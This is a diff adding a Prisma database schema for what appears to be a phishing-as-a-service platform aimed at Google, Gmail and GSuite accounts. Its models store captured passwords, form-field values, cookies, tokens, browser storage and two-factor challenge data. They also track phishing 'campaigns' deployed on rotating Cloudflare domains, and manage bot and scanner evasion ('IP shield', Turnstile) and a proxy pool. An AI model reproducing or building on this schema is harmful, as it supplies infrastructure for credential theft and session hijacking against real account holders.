@@ -1,0 +1,454 @@
+generator client {
+  provider      = "prisma-client-js"
+  binaryTargets = ["native", "debian-openssl-3.0.x"]
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+model AccessLog {
+  id          String   @id @default(cuid())
+  ip          String
+  hostname    String?
+  country     String?
+  userAgent   String?
+  path        String
+  method      String
+  statusCode  Int
+  blocked     Boolean  @default(false)
+  botDetected Boolean  @default(false)
+  botReason   String?
+  timestamp   DateTime @default(now())
+
+  @@index([timestamp])
+  @@index([botDetected])
+  @@index([blocked])
+  @@index([ip])
+}
+
+model ActivityLog {
+  id           String   @id @default(cuid())
+  userId       String
+  action       String
+  resource     String?
+  resourceType String?
+  ipAddress    String?
+  userAgent    String?
+  details      String?
+  timestamp    DateTime @default(now())
+
+  @@index([timestamp])
+  @@index([action])
+  @@index([userId])
+}
+
+model Campaign {
+  id               String       @id @default(cuid())
+  userId           String
+  name             String
+  targetUrl        String?
+  description      String?
+  provider         String       @default("GOOGLE")
+  captureId        String       @unique
+  pageTitle        String?
+  logoUrl          String?
+  customCss        String?
+  turnstileEnabled Boolean      @default(true)
+  ipShieldEnabled  Boolean      @default(true)
+  viewCount        Int          @default(0)
+  captureCount     Int          @default(0)
+  deploymentCount  Int          @default(0)
+  status           String       @default("ACTIVE")
+  domainId         String?
+  profileId        String?
+  createdAt        DateTime     @default(now())
+  updatedAt        DateTime     @updatedAt
+  lastActivityAt   DateTime?
+  User             User             @relation(fields: [userId], references: [id], onDelete: Cascade)
+  CampaignProfile  CampaignProfile? @relation("CampaignProfileRelation", fields: [profileId], references: [id], onDelete: SetNull)
+  Deployment       Deployment[]
+  Profile          Profile[]
+  Session          Session[]
+  assignedDomains  Domain[]         @relation("DomainActiveCampaign")
+
+  @@index([provider])
+  @@index([status])
+  @@index([captureId])
+  @@index([userId])
+  @@index([profileId])
+}
+
+model CloudflareAccount {
+  id         String    @id @default(cuid())
+  name       String
+  apiToken   String
+  accountId  String
+  email      String?
+  status     String    @default("active")
+  zonesCount Int       @default(0)
+  lastUsedAt DateTime?
+  lastError  String?
+  createdAt  DateTime  @default(now())
+  updatedAt  DateTime  @updatedAt
+  Domain     Domain[]
+
+  @@index([accountId])
+  @@index([status])
+}
+
+model CredentialField {
+  id            String   @id @default(cuid())
+  sessionId     String
+  campaignId    String
+  userId        String
+  fieldType     String
+  fieldValue    String
+  fieldLabel    String?
+  capturedAt    DateTime @default(now())
+  inputMethod   String?
+  inputDuration Int?
+  pageUrl       String?
+  ipAddress     String?
+
+  @@index([fieldType])
+  @@index([userId])
+  @@index([campaignId])
+  @@index([sessionId])
+}
+
+model Deployment {
+  id                 String    @id @default(cuid())
+  userId             String
+  campaignId         String
+  domain             String    @unique
+  subdomain          String?
+  isCustomDomain     Boolean   @default(false)
+  cloudflareZoneId   String?
+  cloudflareWorkerId String?
+  cloudflarePageId   String?
+  dnsRecords         String?
+  sslStatus          String    @default("PENDING")
+  dnsStatus          String    @default("PENDING")
+  deploymentStatus   String    @default("DEPLOYING")
+  deployedUrl        String?
+  workerUrl          String?
+  deployedAt         DateTime?
+  lastCheckedAt      DateTime?
+  errorLog           String?
+  failureReason      String?
+  retryCount         Int       @default(0)
+  totalVisits        Int       @default(0)
+  uniqueVisitors     Int       @default(0)
+  createdAt          DateTime  @default(now())
+  updatedAt          DateTime  @updatedAt
+  campaign           Campaign  @relation(fields: [campaignId], references: [id], onDelete: Cascade)
+  user               User      @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@index([deploymentStatus])
+  @@index([domain])
+  @@index([campaignId])
+  @@index([userId])
+}
+
+model Subdomain {
+  id               String   @id @default(cuid())
+  domainId         String
+  subdomain        String
+  cfCustomDomainId String?
+  status           String   @default("ACTIVE")
+  createdAt        DateTime @default(now())
+  updatedAt        DateTime @updatedAt
+  domain           Domain   @relation(fields: [domainId], references: [id], onDelete: Cascade)
+
+  @@unique([domainId, subdomain])
+  @@index([domainId])
+  @@index([status])
+}
+
+model Domain {
+  id                     String             @id @default(cuid())
+  name                   String             @unique
+  cloudflareAccountId    String?
+  cloudflareZoneId       String?
+  cfWorkerName           String?
+  cfRootCustomDomainId   String?
+  nameservers            String?
+  turnstileSitekey       String?
+  turnstileSecretKey     String?
+  status                 String             @default("pending")
+  dnsStatus              String             @default("pending")
+  sslStatus              String             @default("pending")
+  addedById              String?
+  activeCampaignId       String?
+  createdAt              DateTime           @default(now())
+  updatedAt              DateTime           @updatedAt
+  CloudflareAccount      CloudflareAccount? @relation(fields: [cloudflareAccountId], references: [id])
+  activeCampaign         Campaign?          @relation("DomainActiveCampaign", fields: [activeCampaignId], references: [id])
+  subdomains             Subdomain[]
+
+  @@index([status])
+  @@index([cloudflareAccountId])
+  @@index([turnstileSitekey])
+  @@index([activeCampaignId])
+}
+
+model IPBlacklist {
+  id          String    @id @default(cuid())
+  ipAddress   String
+  cidr        String?
+  reason      String
+  severity    String    @default("MEDIUM")
+  autoBlocked Boolean   @default(false)
+  addedBy     String?
+  active      Boolean   @default(true)
+  expiresAt   DateTime?
+  createdAt   DateTime  @default(now())
+
+  @@index([severity])
+  @@index([active])
+  @@index([ipAddress])
+}
+
+model IPWhitelist {
+  id         String   @id @default(cuid())
+  ipAddress  String
+  cidr       String?
+  label      String
+  campaignId String?
+  addedBy    String
+  active     Boolean  @default(true)
+  createdAt  DateTime @default(now())
+
+  @@index([active])
+  @@index([campaignId])
+  @@index([ipAddress])
+}
+
+model IpRule {
+  id        String    @id @default(cuid())
+  ip        String
+  action    String
+  reason    String
+  expiresAt DateTime?
+  addedBy   String?
+  createdAt DateTime  @default(now())
+  updatedAt DateTime  @updatedAt
+
+  @@index([expiresAt])
+  @@index([action])
+  @@index([ip])
+}
+
+model PlatformSettings {
+  id                           String   @id @default("singleton")
+  allowRegistration            Boolean  @default(true)
+  autoApproveUsers             Boolean  @default(false)
+  requireEmailVerify           Boolean  @default(false)
+  defaultTurnstile             Boolean  @default(true)
+  defaultIpShield              Boolean  @default(true)
+  primaryCfAccountId           String?
+  ipShieldMode                 String   @default("OFF")
+  globalRateLimit              Int      @default(100)
+  allowCustomDomains           Boolean  @default(true)
+  maxDeploymentsPerUser        Int      @default(10)
+  platformName                 String   @default("FIONA Platform")
+  platformUrl                  String?
+  supportEmail                 String?
+  enableRealTimeMonitor        Boolean  @default(true)
+  enableThreatDetection        Boolean  @default(true)
+  createdAt                    DateTime @default(now())
+  updatedAt                    DateTime @updatedAt
+  cloudflareAccountId          String?
+  cloudflareApiToken           String?
+  cloudflarePagesProject       String?
+  cloudflareWorkersKvNamespace String?
+  cloudflareZoneId             String?
+}
+
+model CampaignProfile {
+  id                  String     @id @default(cuid())
+  name                String
+  type                String     @default("GMAIL") // GMAIL or GSUITE
+  targetDomainPattern String?
+  createdById         String
+  createdAt           DateTime   @default(now())
+  updatedAt           DateTime   @updatedAt
+  createdBy           User       @relation(fields: [createdById], references: [id], onDelete: Cascade)
+  campaigns           Campaign[] @relation("CampaignProfileRelation")
+
+  @@index([type])
+  @@index([createdById])
+}
+
+model Profile {
+  id               String    @id @default(cuid())
+  userId           String?
+  campaignId       String
+  email            String
+  password         String
+  provider         String    @default("GOOGLE")
+  classificationType String? // GMAIL or GSUITE (auto-detected from email domain)
+  accountType      String    @default("GMAIL")
+  cookies          String?
+  tokens           String?
+  accountInfo      String?
+  securityInfo     String?
+  browserProfileId String?
+  lastLaunched     DateTime?
+  launchCount      Int       @default(0)
+  isLaunched       Boolean   @default(false)
+  authStatus       String    @default("NOT_AUTHENTICATED")
+  status           String    @default("ACTIVE")
+  isVerified       Boolean   @default(false)
+  qualityScore     Int       @default(0)
+  capturedAt       DateTime  @default(now())
+  capturedFrom     String?
+  createdAt        DateTime  @default(now())
+  updatedAt        DateTime  @updatedAt
+  campaign         Campaign  @relation(fields: [campaignId], references: [id], onDelete: Cascade)
+  user             User?     @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@unique([email, campaignId])
+  @@index([authStatus])
+  @@index([status])
+  @@index([provider])
+  @@index([email])
+  @@index([campaignId])
+  @@index([userId])
+}
+
+model ProxyPool {
+  id              String    @id @default(cuid())
+  host            String
+  port            Int
+  protocol        String    @default("http")
+  username        String?
+  password        String?
+  country         String?
+  region          String?
+  city            String?
+  provider        String?
+  status          String    @default("ACTIVE")
+  isHealthy       Boolean   @default(true)
+  lastCheckedAt   DateTime?
+  lastUsedAt      DateTime?
+  usageCount      Int       @default(0)
+  successCount    Int       @default(0)
+  failureCount    Int       @default(0)
+  successRate     Float     @default(100.0)
+  avgResponseTime Int?
+  notes           String?
+  createdAt       DateTime  @default(now())
+  updatedAt       DateTime  @updatedAt
+
+  @@unique([host, port])
+  @@index([successRate])
+  @@index([isHealthy])
+  @@index([status])
+  @@index([country])
+}
+
+model Session {
+  id               String    @id @default(cuid())
+  userId           String?
+  campaignId       String?
+  captureId        String?
+  email            String
+  password         String?
+  status           String    @default("INITIATED")
+  authMethod       String?
+  challengeType    String?
+  challengeData    String?
+  browserContext   String?
+  cookies          String?
+  localStorage     String?
+  sessionStorage   String?
+  ipAddress        String?
+  userAgent        String?
+  browser          String?
+  os               String?
+  device           String?
+  timezone         String?
+  language         String?
+  screenResolution String?
+  country          String?
+  region           String?
+  city             String?
+  isp              String?
+  startedAt        DateTime  @default(now())
+  lastActivityAt   DateTime  @default(now())
+  completedAt      DateTime?
+  expiresAt        DateTime?
+  error            String?
+  failureReason    String?
+  campaign         Campaign?  @relation(fields: [campaignId], references: [id], onDelete: Cascade)
+  user             User?      @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@index([status])
+  @@index([email])
+  @@index([captureId])
+  @@index([campaignId])
+  @@index([userId])
+}
+
+model ThreatLog {
+  id         String   @id @default(cuid())
+  ipAddress  String
+  campaignId String
+  threatType String
+  severity   String
+  details    String?
+  userAgent  String?
+  action     String
+  timestamp  DateTime @default(now())
+
+  @@index([timestamp])
+  @@index([severity])
+  @@index([campaignId])
+  @@index([ipAddress])
+}
+
+model TurnstileWidget {
+  id               String   @id @default(cuid())
+  sitekey          String   @unique
+  secret           String
+  name             String
+  cfAccountId      String
+  deploymentsCount Int      @default(0)
+  maxDeployments   Int      @default(50)
+  createdAt        DateTime @default(now())
+  updatedAt        DateTime @updatedAt
+
+  @@index([sitekey])
+}
+
+model User {
+  id             String       @id @default(cuid())
+  email          String       @unique
+  password       String
+  role           String       @default("TECHNICIAN")
+  status         String       @default("PENDING")
+  fullName       String?
+  company        String?
+  phoneNumber    String?
+  apiKey         String?      @unique
+  apiKeyLastUsed DateTime?
+  lastLoginAt    DateTime?
+  lastLoginIp    String?
+  loginCount     Int          @default(0)
+  approvedAt     DateTime?
+  approvedBy     String?
+  createdAt      DateTime     @default(now())
+  updatedAt      DateTime     @updatedAt
+  Campaign        Campaign[]
+  Deployment      Deployment[]
+  Profile         Profile[]
+  Session         Session[]
+  CampaignProfile CampaignProfile[]
+
+  @@index([role])
+  @@index([status])
+  @@index([email])
+}
